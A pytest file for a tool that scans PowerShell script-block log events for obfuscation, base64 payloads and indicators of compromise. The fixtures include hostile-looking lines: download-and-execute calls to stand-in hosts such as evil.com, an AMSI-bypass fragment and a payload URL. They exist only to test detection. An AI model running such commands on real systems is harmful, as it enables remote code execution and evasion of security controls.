"""Tests for scriptblock_parse.py"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import pytest

# Make sure the module can be imported from the same directory as the test
sys.path.insert(0, str(Path(__file__).parent))

from scriptblock_parse import (
    ObfuscationFlags,
    ScriptBlockResult,
    _decode_b64_payloads,
    _detect_obfuscation,
    _extract_iocs,
    _iter_ndjson,
    _print_summary,
    _try_decode_b64,
    _write_csv,
    _write_json,
    _write_ndjson,
    analyse_script_text,
    main,
)


# ---------------------------------------------------------------------------
# Base64 helpers
# ---------------------------------------------------------------------------

class TestTryDecodeB64:
    def test_decodes_utf16le_payload(self):
        # PowerShell commonly encodes commands as UTF-16LE base64
        text = "Write-Host 'hello'"
        encoded = base64.b64encode(text.encode('utf-16-le')).decode()
        result = _try_decode_b64(encoded)
        assert result is not None
        assert 'hello' in result

    def test_decodes_utf8_payload(self):
        text = "Invoke-Expression 'whoami'"
        encoded = base64.b64encode(text.encode('utf-8')).decode()
        result = _try_decode_b64(encoded)
        assert result is not None
        assert 'whoami' in result

    def test_returns_none_for_garbage(self):
        result = _try_decode_b64('!!!notbase64!!!')
        assert result is None

    def test_returns_none_for_binary_blob(self):
        # Binary with low printable ratio should not decode
        raw = bytes(range(256))
        encoded = base64.b64encode(raw).decode()
        result = _try_decode_b64(encoded)
        assert result is None


class TestDecodeB64Payloads:
    def test_replaces_encoded_payload_in_text(self):
        # String must produce ≥40 base64 chars — UTF-16LE doubles byte length so
        # "Get-Process; Stop-Service svc1" (30 chars) → 60 bytes → 80 b64 chars.
        payload = "Get-Process; Stop-Service svc1"
        encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
        assert len(encoded) >= 40, "test payload too short — increase string length"
        script = f"-EncodedCommand {encoded}"
        expanded, decoded = _decode_b64_payloads(script)
        assert decoded is True
        assert '[DECODED:' in expanded

    def test_no_decode_for_normal_text(self):
        script = "Write-Host 'hello world'"
        _, decoded = _decode_b64_payloads(script)
        assert decoded is False

    def test_short_strings_not_decoded(self):
        # Strings under 40 chars don't match the pattern
        script = "aGVsbG8="   # "hello" in base64 but too short
        _, decoded = _decode_b64_payloads(script)
        assert decoded is False


# ---------------------------------------------------------------------------
# IOC extraction
# ---------------------------------------------------------------------------

class TestExtractIOCs:
    def test_extracts_ipv4(self):
        text = "Connect to 192.168.1.100 or 10.0.0.1"
        ips, _, _, _ = _extract_iocs(text)
        assert '192.168.1.100' in ips
        assert '10.0.0.1' in ips

    def test_skips_loopback(self):
        text = "localhost is 127.0.0.1"
        ips, _, _, _ = _extract_iocs(text)
        assert '127.0.0.1' not in ips

    def test_extracts_http_url(self):
        text = "Invoke-WebRequest -Uri http://evil.example.com/payload.ps1"
        _, urls, _, _ = _extract_iocs(text)
        assert any('evil.example.com' in u for u in urls)

    def test_extracts_filepath(self):
        text = r"Copy-Item C:\Users\bob\AppData\Local\Temp\loader.exe"
        _, _, paths, _ = _extract_iocs(text)
        assert any('loader.exe' in p for p in paths)

    def test_extracts_regpath(self):
        text = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        _, _, _, regs = _extract_iocs(text)
        assert len(regs) >= 1

    def test_no_false_positives_on_clean_script(self):
        text = "Get-Process | Where-Object { $_.CPU -gt 50 }"
        ips, urls, _, _ = _extract_iocs(text)
        assert len(ips) == 0
        assert len(urls) == 0


# ---------------------------------------------------------------------------
# Obfuscation detection
# ---------------------------------------------------------------------------

class TestDetectObfuscation:
    def test_char_cast(self):
        flags = _detect_obfuscation('[char]104+[char]101+[char]108')
        assert flags.char_cast is True

    def test_iex(self):
        flags = _detect_obfuscation('iex (Get-Content payload.txt)')
        assert flags.iex is True

    def test_invoke_expression(self):
        flags = _detect_obfuscation('Invoke-Expression $code')
        assert flags.iex is True

    def test_download(self):
        flags = _detect_obfuscation('(New-Object Net.WebClient).DownloadString("http://x.com")')
        assert flags.download is True

    def test_amsi_bypass(self):
        flags = _detect_obfuscation('[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")')
        assert flags.amsi_bypass is True

    def test_clean_script(self):
        flags = _detect_obfuscation('Get-ChildItem -Path C:\\ -Recurse')
        assert flags.score == 0

    def test_score_accumulates(self):
        flags = _detect_obfuscation('iex [char]104; (New-Object Net.WebClient).DownloadString("http://x")')
        assert flags.score >= 3


# ---------------------------------------------------------------------------
# analyse_script_text
# ---------------------------------------------------------------------------

class TestAnalyseScriptText:
    def test_clean_script_not_flagged(self):
        result = analyse_script_text("Get-Process")
        assert result.flagged is False

    def test_obfuscated_script_flagged(self):
        script = 'iex [char]104+[char]101; (New-Object Net.WebClient).DownloadString("http://evil.com/a")'
        result = analyse_script_text(script)
        assert result.flagged is True
        assert result.obfuscation.score >= 2

    def test_ip_in_script_flags(self):
        result = analyse_script_text("Connect 10.0.0.99")
        assert result.flagged is True
        assert '10.0.0.99' in result.iocs_ipv4

    def test_url_in_script_flags(self):
        result = analyse_script_text("http://malware.example.com/payload")
        assert result.flagged is True

    def test_preview_truncated(self):
        long_script = 'A' * 500
        result = analyse_script_text(long_script)
        assert len(result.script_preview) <= 205  # 200 + ellipsis

    def test_fields_populated(self):
        result = analyse_script_text(
            script_text="Get-Process",
            event_record_id='123',
            time_created='2026-01-01T00:00:00Z',
            computer='HOST1',
            user_id='S-1-5-21-...',
        )
        assert result.event_record_id == '123'
        assert result.computer == 'HOST1'

    def test_to_dict_shape(self):
        result = analyse_script_text("Get-Process")
        d = result.to_dict()
        assert 'flagged' in d
        assert 'obfuscation' in d
        assert 'obfuscation_score' in d
        assert isinstance(d['iocs_ipv4'], list)


# ---------------------------------------------------------------------------
# NDJSON reader
# ---------------------------------------------------------------------------

class TestIterNDJSON:
    def _make_ndjson(self, tmp_path: Path, events: list[dict]) -> Path:
        p = tmp_path / 'events.ndjson'
        with p.open('w') as fh:
            for e in events:
                fh.write(json.dumps(e) + '\n')
        return p

    def _winlogbeat_event(self, script_text: str, event_id: int = 4104) -> dict:
        return {
            '@timestamp': '2026-01-01T00:00:00Z',
            'event': {'code': str(event_id)},
            'winlog': {
                'record_id': '42',
                'computer_name': 'TEST-HOST',
                'user': {'identifier': 'S-1-5-21-test'},
                'event_data': {
                    'ScriptBlockText': script_text,
                    'Path': '',
                },
            },
        }

    def test_reads_4104_event(self, tmp_path):
        path = self._make_ndjson(tmp_path, [self._winlogbeat_event('Get-Process')])
        results = list(_iter_ndjson(path))
        assert len(results) == 1
        assert results[0].computer == 'TEST-HOST'

    def test_skips_non_4104_events(self, tmp_path):
        events = [
            self._winlogbeat_event('Get-Process', event_id=4624),
            self._winlogbeat_event('Set-Variable', event_id=4104),
        ]
        path = self._make_ndjson(tmp_path, events)
        results = list(_iter_ndjson(path))
        assert len(results) == 1

    def test_skips_empty_lines(self, tmp_path):
        path = tmp_path / 'events.ndjson'
        path.write_text(
            json.dumps(self._winlogbeat_event('Get-Process')) + '\n\n\n',
            encoding='utf-8',
        )
        results = list(_iter_ndjson(path))
        assert len(results) == 1

    def test_skips_events_without_script_text(self, tmp_path):
        event = self._winlogbeat_event('')
        path = self._make_ndjson(tmp_path, [event])
        results = list(_iter_ndjson(path))
        assert len(results) == 0

    def test_handles_malformed_json_gracefully(self, tmp_path, capsys):
        path = tmp_path / 'events.ndjson'
        good = self._winlogbeat_event('Get-Process')
        path.write_text('not json\n' + json.dumps(good) + '\n', encoding='utf-8')
        results = list(_iter_ndjson(path))
        # Should still parse the valid line
        assert len(results) == 1


# ---------------------------------------------------------------------------
# Output writers
# ---------------------------------------------------------------------------

class TestWriters:
    def _sample_results(self) -> list[ScriptBlockResult]:
        return [
            analyse_script_text('Get-Process', computer='HOST1'),
            analyse_script_text(
                'iex [char]104; http://evil.com/a',
                computer='HOST2',
                time_created='2026-01-01T00:00:00Z',
            ),
        ]

    def test_write_json(self, tmp_path):
        out = tmp_path / 'out.json'
        _write_json(self._sample_results(), out)
        data = json.loads(out.read_text())
        assert isinstance(data, list)
        assert len(data) == 2
        assert 'flagged' in data[0]

    def test_write_csv(self, tmp_path):
        out = tmp_path / 'out.csv'
        _write_csv(self._sample_results(), out)
        content = out.read_text()
        assert 'computer' in content.lower() or 'flagged' in content.lower()

    def test_write_ndjson(self, tmp_path):
        out = tmp_path / 'out.ndjson'
        _write_ndjson(self._sample_results(), out)
        lines = [l for l in out.read_text().splitlines() if l.strip()]
        assert len(lines) == 2
        assert json.loads(lines[0])['computer'] == 'HOST1'

    def test_write_csv_empty(self, tmp_path):
        out = tmp_path / 'empty.csv'
        _write_csv([], out)
        assert out.read_text() == ''


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

class TestMain:
    def _make_ndjson(self, tmp_path: Path, n: int = 3) -> Path:
        p = tmp_path / 'events.ndjson'
        with p.open('w') as fh:
            for i in range(n):
                doc = {
                    '@timestamp': f'2026-01-0{i+1}T00:00:00Z',
                    'event': {'code': '4104'},
                    'winlog': {
                        'record_id': str(i),
                        'computer_name': f'HOST{i}',
                        'user': {'identifier': 'S-1-5-21'},
                        'event_data': {'ScriptBlockText': f'Get-Process {i}', 'Path': ''},
                    },
                }
                fh.write(json.dumps(doc) + '\n')
        return p

    def test_runs_without_output_flag(self, tmp_path, capsys):
        inp = self._make_ndjson(tmp_path)
        rc = main(['--input', str(inp), '--stdout'])
        assert rc == 0

    def test_writes_json_output(self, tmp_path):
        inp = self._make_ndjson(tmp_path)
        out = tmp_path / 'out.json'
        rc = main(['--input', str(inp), '--output', str(out)])
        assert rc == 0
        assert out.exists()
        data = json.loads(out.read_text())
        assert isinstance(data, list)

    def test_writes_csv_output(self, tmp_path):
        inp = self._make_ndjson(tmp_path)
        out = tmp_path / 'out.csv'
        rc = main(['--input', str(inp), '--output', str(out)])
        assert rc == 0
        assert out.exists()

    def test_flagged_only_filter(self, tmp_path):
        p = tmp_path / 'events.ndjson'
        with p.open('w') as fh:
            clean = {
                'event': {'code': '4104'},
                'winlog': {'record_id': '1', 'computer_name': 'H',
                           'event_data': {'ScriptBlockText': 'Get-Process', 'Path': ''}},
            }
            dirty = {
                'event': {'code': '4104'},
                'winlog': {'record_id': '2', 'computer_name': 'H',
                           'event_data': {'ScriptBlockText': 'iex [char]65; http://evil.com/', 'Path': ''}},
            }
            fh.write(json.dumps(clean) + '\n')
            fh.write(json.dumps(dirty) + '\n')
        out = tmp_path / 'out.json'
        main(['--input', str(p), '--output', str(out), '--flagged-only'])
        data = json.loads(out.read_text())
        assert all(d['flagged'] for d in data)

    def test_missing_input_returns_error(self, tmp_path):
        rc = main(['--input', str(tmp_path / 'does_not_exist.ndjson')])
        assert rc != 0

    def test_unknown_output_extension_returns_error(self, tmp_path):
        inp = self._make_ndjson(tmp_path)
        out = tmp_path / 'out.xyz'
        rc = main(['--input', str(inp), '--output', str(out)])
        assert rc != 0
